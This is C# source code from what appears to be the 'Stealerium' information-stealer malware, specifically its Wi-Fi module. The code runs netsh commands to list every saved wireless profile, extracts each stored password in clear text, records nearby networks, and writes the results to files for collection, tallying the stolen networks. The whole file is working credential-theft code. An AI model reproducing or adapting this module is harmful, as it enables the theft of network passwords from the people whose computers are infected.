using System;
using System.IO;
using System.Linq;
using Stealerium.Helpers;

namespace Stealerium.Target.System;

internal sealed class Wifi
{
	private static string[] GetProfiles()
	{
		string[] array = CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All").Split(new char[2] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
		}
		return array;
	}

	private static string GetPassword(string profile)
	{
		return CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear | findstr Key").Split(new char[1] { ':' }).Last()
			.Trim();
	}

	public static void ScanningNetworks(string sSavePath)
	{
		string text = CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid");
		if (!text.Contains("is not running"))
		{
			File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", text);
		}
	}

	public static void SavedNetworks(string sSavePath)
	{
		string[] profiles = GetProfiles();
		foreach (string text in profiles)
		{
			if (!text.Equals("65001"))
			{
				Counter.SavedWifiNetworks++;
				string password = GetPassword(text);
				string contents = "PROFILE: " + text + "\nPASSWORD: " + password + "\n\n";
				File.AppendAllText(sSavePath + "\\SavedNetworks.txt", contents);
			}
		}
	}
}
